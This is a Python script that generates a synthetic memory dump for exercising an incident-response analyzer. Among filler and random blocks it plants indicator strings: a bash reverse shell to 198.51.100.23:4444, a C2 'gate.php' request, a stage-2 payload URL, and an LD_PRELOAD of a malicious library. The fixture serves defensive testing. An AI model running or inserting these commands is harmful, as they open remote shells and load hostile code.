#!/usr/bin/env python3
"""
Generate a bounded SYNTHETIC memory sample for pipeline exercise when a real host
RAM capture isn't reachable (rootless container, no kernel memory access).

This is NOT a real memory image and is always flagged is_synthetic=true upstream. It
embeds realistic artifacts so the server-side analyzer produces meaningful, verifiable
findings: a routable C2-style IP, a URL, a reverse-shell token, and a high-entropy
(random) region that trips the packed/encrypted heuristic — interleaved with ordinary
low-entropy filler so entropy scoring is realistic.
"""
import os
import sys

SIZE = int(os.environ.get("IR_SAMPLE_BYTES", str(24 * 1024 * 1024)))  # 24 MiB default
BLOCK = 512 * 1024  # fixed block so every block type is reached within the budget


def _fill(base, size):
    return (base * (size // len(base) + 1))[:size]


def main(path):
    # Low-entropy filler (ordinary process memory-ish).
    filler = b"the quick brown fox jumps over the lazy dog 0123456789 " * 32
    # Planted artifacts the analyzer should surface.
    artifacts = b"".join([
        b"\x00GET /gate.php HTTP/1.1\r\nHost: 203.0.113.66\r\n\x00",
        b"http://malicious-c2.example.net/payload/stage2.bin\x00",
        b"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\x00",
        b"LD_PRELOAD=/tmp/.x/evil.so\x00",
    ])
    written = 0
    block = 0
    with open(path, "wb") as fh:
        while written < SIZE:
            i = block % 8
            if i == 3:                                    # high-entropy region
                chunk = os.urandom(BLOCK)
            elif i == 5:                                  # planted artifacts + filler
                chunk = _fill(artifacts + filler, BLOCK)
            else:                                         # ordinary low-entropy memory
                chunk = _fill(filler, BLOCK)
            chunk = chunk[: min(len(chunk), SIZE - written)]
            fh.write(chunk)
            written += len(chunk)
            block += 1
    print(f"[make_sample] wrote synthetic sample {path} ({written} bytes, {block} blocks)")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/sample.raw")
